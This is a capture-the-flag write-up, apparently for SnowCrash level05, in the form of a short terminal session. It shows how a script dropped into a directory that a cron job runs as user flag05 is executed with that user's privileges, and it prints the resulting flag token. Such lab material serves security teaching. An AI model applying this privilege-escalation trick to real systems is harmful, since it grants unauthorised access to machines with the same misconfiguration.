```
  level05@SnowCrash:/var/mail$ cat level05
  */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
  level05@SnowCrash:/usr/sbin$ cat openarenaserver
  #!/bin/sh

  for i in /opt/openarenaserver/* ; do
	  (ulimit -t 5; bash -x "$i")
	  rm -f "$i"
  done
  level05@SnowCrash:/opt/openarenaserver$ echo "getflag >> /tmp/flag05" >> script
  level05@SnowCrash:/opt/openarenaserver$ cat script
  getflag >> /tmp/flag05
  level05@SnowCrash:/opt/openarenaserver$ ls
  script
  level05@SnowCrash:/opt/openarenaserver$ ls (apres deux minutes max, le script s'execute avec le groupe flag05 et le script est removed du dossier)
  level05@SnowCrash:/opt/openarenaserver$ cat /tmp/flag05
  Check flag.Here is your token : viuaaale9huek52boumoomioc
 ```
